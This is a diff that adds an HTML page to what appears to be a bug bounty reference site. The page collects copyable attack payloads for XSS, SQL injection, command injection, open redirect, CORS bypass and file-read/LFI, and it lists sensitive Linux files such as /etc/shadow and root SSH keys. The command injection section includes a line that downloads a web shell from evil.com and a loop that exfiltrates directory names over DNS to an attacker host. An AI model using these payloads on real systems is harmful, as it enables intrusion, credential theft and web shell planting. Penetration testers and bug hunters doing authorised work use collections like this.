@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>All Payloads Collection - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-logo">
+                <img src="logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle">
+                <i class="fas fa-bars"></i>
+            </button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link active">Vulnerabilities <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="manual-open-redirect.html"><i class="fas fa-external-link-alt"></i> Manual Open Redirect</a></li>
+                        <li><a href="open-redirect.html"><i class="fas fa-robot"></i> Automated Open Redirect</a></li>
+                        <li><a href="xss.html"><i class="fas fa-bug"></i> XSS</a></li>
+                        <li><a href="blind-xss.html"><i class="fas fa-eye-slash"></i> Blind XSS</a></li>
+                        <li><a href="sqli.html"><i class="fas fa-database"></i> SQL Injection</a></li>
+                        <li><a href="idor.html"><i class="fas fa-id-card"></i> IDOR</a></li>
+                        <li><a href="lfi.html"><i class="fas fa-folder-open"></i> LFI</a></li>
+                        <li><a href="cmdi.html"><i class="fas fa-terminal"></i> Command Injection</a></li>
+                        <li><a href="subdomain-takeover.html"><i class="fas fa-globe"></i> Subdomain Takeover</a></li>
+                        <li><a href="cors.html"><i class="fas fa-exchange-alt"></i> CORS</a></li>
+                        <li><a href="csp-guide.html"><i class="fas fa-shield-alt"></i> CSP Guide</a></li>
+                        <li><a href="xxe.html"><i class="fas fa-file-code"></i> XXE</a></li>
+                        <li><a href="ssti.html"><i class="fas fa-file-alt"></i> SSTI</a></li>
+                        <li><a href="crlf.html"><i class="fas fa-code"></i> CRLF Injection</a></li>
+                        <li><a href="ssrf-payloads.html"><i class="fas fa-server"></i> SSRF Payloads</a></li>
+                        <li><a href="race-conditions.html"><i class="fas fa-stopwatch"></i> Race Conditions</a></li>
+                        <li><a href="poisoning.html"><i class="fas fa-bolt"></i> Cache Poisoning</a></li>
+                        <li><a href="information-disclosure.html"><i class="fas fa-eye"></i> Info Disclosure</a></li>
+                        <li><a href="host-header-injection.html"><i class="fas fa-globe-americas"></i> Host Header</a></li>
+                        <li><a href="header-injection.html"><i class="fas fa-heading"></i> Header Injection</a></li>
+                        <li><a href="html-injection.html"><i class="fas fa-code"></i> HTML Injection</a></li>
+                        <li><a href="directory-traversal.html"><i class="fas fa-folder"></i> Directory Traversal</a></li>
+                        <li><a href="wordpress.html"><i class="fab fa-wordpress"></i> WordPress</a></li>
+                        <li><a href="spring-boot.html"><i class="fas fa-leaf"></i> Spring Boot</a></li>
+                    </ul>
+                </li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Tools <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="useful-tools.html"><i class="fas fa-toolbox"></i> Recon Tools</a></li>
+                        <li><a href="nuclei.html"><i class="fas fa-rocket"></i> Nuclei</a></li>
+                    </ul>
+                </li>
+                <li><a href="about.html" class="nav-link">About</a></li>
+                <li><a href="payloads.html" class="nav-link">Payloads</a></li>
+                <li><a href="all-payloads.html" class="nav-link active">All Payloads</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <a href="payloads.html">Payloads</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>All Payloads Collection</span>
+        </div>
+        <h1><i class="fas fa-bomb"></i> Complete Payload Collection</h1>
+        <p>All payloads from txt files organized by vulnerability type.</p>
+    </header>
+
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-list"></i> Available Payload Collections</h2>
+                <div class="vuln-grid" style="margin-top: 1rem;">
+                    <a href="#xss" class="vuln-card">
+                        <i class="fas fa-bug"></i>
+                        <span>XSS (2690+)</span>
+                    </a>
+                    <a href="#sqli" class="vuln-card">
+                        <i class="fas fa-database"></i>
+                        <span>SQLi (3600+)</span>
+                    </a>
+                    <a href="#cmdi" class="vuln-card">
+                        <i class="fas fa-terminal"></i>
+                        <span>Command Injection</span>
+                    </a>
+                    <a href="#openredirect" class="vuln-card">
+                        <i class="fas fa-external-link-alt"></i>
+                        <span>Open Redirect</span>
+                    </a>
+                    <a href="#cors" class="vuln-card">
+                        <i class="fas fa-exchange-alt"></i>
+                        <span>CORS Bypass</span>
+                    </a>
+                    <a href="#lfi" class="vuln-card">
+                        <i class="fas fa-folder-open"></i>
+                        <span>LFI / File Read</span>
+                    </a>
+                    <a href="#htmli" class="vuln-card">
+                        <i class="fas fa-code"></i>
+                        <span>HTML Injection</span>
+                    </a>
+                    <a href="#tamilsevan" class="vuln-card">
+                        <i class="fas fa-star"></i>
+                        <span>TamilsevanS Payloads</span>
+                    </a>
+                </div>
+            </div>
+
+            <!-- XSS Payloads -->
+            <div class="content-card" id="xss">
+                <h2><i class="fas fa-bug"></i> XSS Payloads (2690+)</h2>
+                <p>Source: <code>XSS Payloads/xss_all_payloads.txt</code></p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>'-prompt(8)-'
+";a=prompt,a()//
+';a=prompt,a()//
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<script>javascript:alert(1)</script>
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<a href="javascript:alert(1)">click</a>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<link rel=stylesheet href="javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<form action="javascript:alert(1)"><button>click</button></form>
+<frameset onload=alert(1)>
+<table background="javascript:alert(1)">
+<!--<img src="--><img src=x onerror=alert(1)//">
+<style><img src="</style><img src=x onerror=alert(1)//"></style>
+<script src="//xss.com"></script>
+<applet code="javascript:alert(1)">
+<base href="javascript:alert(1)//">
+<frame src="javascript:alert(1)">
+<bgsound src="javascript:alert(1)">
+<layer src="javascript:alert(1)">
+<import namespace="x" implementation="javascript:alert(1)">
+<x:script>javascript:alert(1)</x:script>
+<x xmlns:x="javascript:alert(1)">
+<a href="javascript:alert(1)" style="behavior:url(#default#AnchorClick);">X</a>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+<math href="javascript:alert(1)">CLICKME</math>
+<maction actiontype="statusline" xlink:href="javascript:alert(1)">CLICKME</maction>
+<html:script xmlns:html="http://www.w3.org/1999/xhtml">javascript:alert(1)</html:script></pre>
+                </div>
+                <p><a href="payloads-xss.html" class="btn btn-primary">View Full XSS Collection</a></p>
+            </div>
+
+            <!-- SQLi Payloads -->
+            <div class="content-card" id="sqli">
+                <h2><i class="fas fa-database"></i> SQL Injection Payloads (3600+)</h2>
+                <p>Source: <code>SQLi Payloads/SQLi-all-payloads.txt</code></p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND (SELECT COUNT(*) FROM users)>0
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
+' AND (SELECT 1 FROM dual) IS NOT NULL
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'#
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT @@version--
+' UNION SELECT database()--
+' UNION SELECT user()--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' AND 1=CONVERT(int,@@version)--
+' AND 1=1 AND 'a'='a
+' AND 1=0 AND 'a'='a
+1' AND 1=1--
+1' AND 1=0--
+1' OR 1=1--
+1' OR 1=0--
+' AND SLEEP(5)--
+' AND pg_sleep(5)--
+' OR SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--</pre>
+                </div>
+                <p><a href="payloads-sqli.html" class="btn btn-primary">View Full SQLi Collection</a></p>
+            </div>
+
+            <!-- Command Injection -->
+            <div class="content-card" id="cmdi">
+                <h2><i class="fas fa-terminal"></i> Command Injection Payloads</h2>
+                <p>Source: <code>CMDinjection-payloads.txt</code></p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>cat /etc/passwd
+id
+whoami
+command1; command2
+command1 && command2
+command1 || command2
+command1 & command2
+command1 | command2
+`cat /etc/passwd`
+$(cat /etc/passwd)
+cat${IFS}/etc/passwd
+{cat,/etc/passwd}
+cat</etc/passwd
+X=$'uname\x20-a'&&$X
+ping%CommonProgramFiles:~10,-18%127.0.0.1
+cat /et\nc/pa\nsswd
+${HOME:0:1}etc${HOME:0:1}passwd
+/???/??t /???/p??s??
+xxd -r -p <<< 2f6574632f706173737764
+wh''oami
+wh``oami
+who$@ami
+w\ho\am\i
+w"h"o"am"i
+w'h'o'am'i
+who$()ami
+wh``oami
+powershel^l whoami
+powershell C:\*\*2\n??e*d.*?
+curl http://evil.com/ -o webshell.php
+for i in $(ls /) ; do host "$i.attacker.dns"; done</pre>
+                </div>
+            </div>
+
+            <!-- Open Redirect -->
+            <div class="content-card" id="openredirect">
+                <h2><i class="fas fa-external-link-alt"></i> Open Redirect Payloads</h2>
+                <p>Source: <code>Open-Redirect-Payloads.txt</code></p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>https://evil.com
+http://evil.com
+//evil.com
+///evil.com
+%2f%2fevil.com
+%252f%252fevil.com
+https://target.com@evil.com
+https:/\/evil.com
+https:\evil.com
+https://evil.com.target.com
+https://target.com.evil.com
+https://evil.com%00.target.com
+https://evil.com%E3%80%82target.com
+/../evil.com
+../../evil.com
+/
+
+evil.com
+%0d%0aLocation:https://evil.com
+https://127.0.0.1
+https://2130706433
+https://0x7f000001
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+vbscript:alert(1)
+file:///etc/passwd
+ftp://evil.com</pre>
+                </div>
+            </div>
+
+            <!-- CORS Bypass -->
+            <div class="content-card" id="cors">
+                <h2><i class="fas fa-exchange-alt"></i> CORS Bypass Payloads</h2>
+                <p>Source: <code>CORS-payloads.txt</code></p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>https://evil.com
+http://evil.com
+https://evil.com:443
+https://evil.com:8443
+null
+https://victim.example.com.evil.com
+https://evil.com.victim.example.com
+https://victimexample.com
+https://victim.example.com@evil.com
+https://evil.com@victim.example.com
+https://victim-example.com
+https://victim_example.com
+https://apiiexample.com
+https://apiXexample.com
+https://api-example.com
+file://
+data://
+chrome-extension://evil
+moz-extension://evil
+https://evil.com%00.victim.example.com
+https://evil.com%2e.victim.example.com
+https://evil.com#victim.example.com
+https://evil.com?.victim.example.com</pre>
+                </div>
+            </div>
+
+            <!-- LFI / File Read -->
+            <div class="content-card" id="lfi">
+                <h2><i class="fas fa-folder-open"></i> LFI / File Read Payloads</h2>
+                <p>Source: <code>HTMLi Payloads/HTMLi-Readfile-Payloads.txt</code></p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>/etc/passwd
+/etc/passwd%00
+/etc/passwd?
+%2Fetc%2Fpasswd
+%2Fetc%2Fpasswd%2500
+%2Fetc%2Fpasswd%3F
+../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../etc/passwd%00
+../../../../../../etc/passwd?
+....//....//....//....//....//....//....//etc/passwd%00
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%3F
+/etc/knockd.conf
+%2Fetc%2Fknockd.conf
+../../../../../../etc/knockd.conf
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fknockd.conf
+/etc/issue
+%2Fetc%2Fissue
+../../../../../../etc/issue
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fissue
+/etc/shadow
+%2Fetc%2Fshadow
+../../../../../../etc/shadow
+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
+/etc/group
+%2Fetc%2Fgroup</pre>
+                </div>
+            </div>
+
+            <!-- HTML Injection -->
+            <div class="content-card" id="htmli">
+                <h2><i class="fas fa-code"></i> HTML Injection Payloads</h2>
+                <p>Source: <code>HTMLi Payloads/</code></p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>&lt;h1&gt;test&lt;/h1&gt;
+&lt;h2&gt;test&lt;/h2&gt;
+&lt;h3&gt;test&lt;/h3&gt;
+&lt;img src=x&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;a href="https://evil.com"&gt;click&lt;/a&gt;
+&lt;form action="https://evil.com"&gt;&lt;input type="submit"&gt;&lt;/form&gt;
+&lt;marquee&gt;test&lt;/marquee&gt;
+&lt;marquee onstart=alert(1)&gt;
+&lt;div style="background:red"&gt;test&lt;/div&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;iframe src="https://evil.com"&gt;&lt;/iframe&gt;
+&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;select onfocus=alert(1) autofocus&gt;
+&lt;textarea onfocus=alert(1) autofocus&gt;
+&lt;video src=x onerror=alert(1)&gt;
+&lt;audio src=x onerror=alert(1)&gt;
+&lt;input type="image" src=x onerror=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;frameset onload=alert(1)&gt;
+&lt;table background="javascript:alert(1)"&gt;
+&lt;base href="javascript:alert(1)//"&gt;</pre>
+                </div>
+            </div>
+
+            <!-- TamilsevanS Payloads -->
+            <div class="content-card" id="tamilsevan">
+                <h2><i class="fas fa-star"></i> TamilsevanS Advanced Payloads</h2>
+                <p>Advanced payload collections by TamilsevanS</p>
+                <div class="vuln-grid" style="margin-top: 1rem;">
+                    <a href="tamilsevan-xss.html" class="vuln-card">
+                        <i class="fas fa-bug"></i>
+                        <span>XSS Payloads</span>
+                    </a>
+                    <a href="tamilsevan-sqli.html" class="vuln-card">
+                        <i class="fas fa-database"></i>
+                        <span>SQLi Payloads</span>
+                    </a>
+                    <a href="tamilsevan-lfi.html" class="vuln-card">
+                        <i class="fas fa-folder-open"></i>
+                        <span>LFI Payloads</span>
+                    </a>
+                    <a href="tamilsevan-ssrf.html" class="vuln-card">
+                        <i class="fas fa-server"></i>
+                        <span>SSRF Payloads</span>
+                    </a>
+                    <a href="tamilsevan-xxe.html" class="vuln-card">
+                        <i class="fas fa-file-code"></i>
+                        <span>XXE Payloads</span>
+                    </a>
+                    <a href="tamilsevan-nosql.html" class="vuln-card">
+                        <i class="fas fa-database"></i>
+                        <span>NoSQL Injection</span>
+                    </a>
+                    <a href="tamilsevan-jwt.html" class="vuln-card">
+                        <i class="fas fa-key"></i>
+                        <span>JWT Payloads</span>
+                    </a>
+                    <a href="tamilsevan-redirect.html" class="vuln-card">
+                        <i class="fas fa-external-link-alt"></i>
+                        <span>Redirect Payloads</span>
+                    </a>
+                </div>
+            </div>
+
+            <!-- Linux Sensitive Files -->
+            <div class="content-card" id="linuxfiles">
+                <h2><i class="fab fa-linux"></i> Linux Sensitive Files</h2>
+                <p>Source: <code>linux-sensitivefiles.txt</code></p>
+                <div class="code-block">
+                    <button class="copy-btn">Copy All</button>
+                    <pre>/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/resolv.conf
+/etc/network/interfaces
+/etc/crontab
+/etc/ssh/sshd_config
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/etc/mysql/my.cnf
+/etc/redis/redis.conf
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/var/log/syslog
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/self/maps
+/proc/version
+/root/.bash_history
+/root/.ssh/id_rsa
+/home/user/.bash_history
+/home/user/.ssh/id_rsa
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/var/www/html/.env</pre>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+            <p>Made with <i class="fas fa-heart"></i> for the security community</p>
+        </div>
+    </footer>
+
+    <div id="toast" class="toast">Copied to clipboard!</div>
+    <script src="script.js"></script>
+</body>
+</html>
